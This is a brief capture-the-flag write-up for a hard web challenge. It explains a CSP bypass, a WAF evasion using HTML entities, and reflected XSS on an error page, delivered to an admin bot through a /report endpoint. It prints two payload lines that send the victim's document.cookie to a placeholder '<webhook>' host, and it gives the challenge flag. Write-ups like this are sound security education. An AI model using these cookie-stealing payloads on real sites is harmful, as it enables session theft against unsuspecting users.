# Jinxed

### Difficulty
hard

### Challenge Description

Bring down the bot, from the undercity.

# Short Writeup: CSP Bypass, WAF Restriction, and XSS Exploitation

## Challenge Overview
The challenge involved exploiting multiple vulnerabilities in a web application:

1. **CSP Bypass**: A strict CSP (`default-src 'self'`) was misconfigured, allowing bypasses through quirks in resource handling.  
2. **Error Page XSS**: Invalid paths returned `200 OK` with reflective XSS opportunities.  
3. **WAF Restrictions**: A basic WAF blocked specific special characters (`<`, `>`, etc.), requiring creative encoding techniques to craft payloads.  
4. **/report Endpoint**: A vulnerable endpoint (`/report?url=...`) visited attacker-supplied URLs, enabling SSRF and admin-side XSS execution.

## Exploitation Highlights

### 1. WAF Bypass
Encoded payloads like `&#60;` were used to circumvent the WAF restrictions on `<`, `>`, and similar characters.

### 2. XSS Execution
The error page allowed injection of JavaScript via a crafted URL:
```html
<script src="/x/;location.href='<webhook>/'+encodeURI(document.cookie);//"></script>
```
### 3. Flag Retrieval
The XSS payload was sent to the admin via the /report endpoint:
```html
/report?url=http://example.com/x/;location.href='<webhook>/'+encodeURI(document.cookie);
```
This successfully stole the admin's cookie, revealing the flag.


### Flag

inctfj{P3RH4P5_E330RS_W3R3_TH3_W4Y_T0_5UCC33D}

### Author

**k0w4lzk1**